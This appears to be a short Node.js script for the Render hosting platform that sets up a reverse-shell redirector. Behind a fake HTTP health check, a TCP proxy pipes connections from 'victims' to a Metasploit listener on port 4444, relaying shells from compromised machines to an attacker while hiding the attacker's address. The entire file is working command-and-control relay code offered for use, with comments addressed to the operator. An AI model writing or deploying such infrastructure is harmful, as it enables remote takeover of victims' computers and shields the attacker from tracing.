const net = require('net');
const http = require('http');

// Render uses this dynamic port to keep your service live
const PORT = process.env.PORT || 10000;

// 1. HTTP Server: To satisfy Render's health check and avoid 502 errors
const httpServer = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Server is running properly\n');
});

// 2. TCP Proxy: This captures the victim's signal and sends it to your PC
const tcpServer = net.createServer((socket) => {
    console.log('Victim signal received!');
    // Forwarding to your local Metasploit on port 4444
    const client = net.createConnection({ port: 4444, host: '127.0.0.1' });
    
    socket.pipe(client);
    client.pipe(socket);
    
    socket.on('error', (e) => console.log('Socket Error:', e.message));
    client.on('error', (e) => console.log('Client Error:', e.message));
});

// IMPORTANT: We listen on the Render-provided port (PORT)
// Render maps this port to public port 443 automatically
tcpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`Proxy server is live and stable on port ${PORT}`);
});
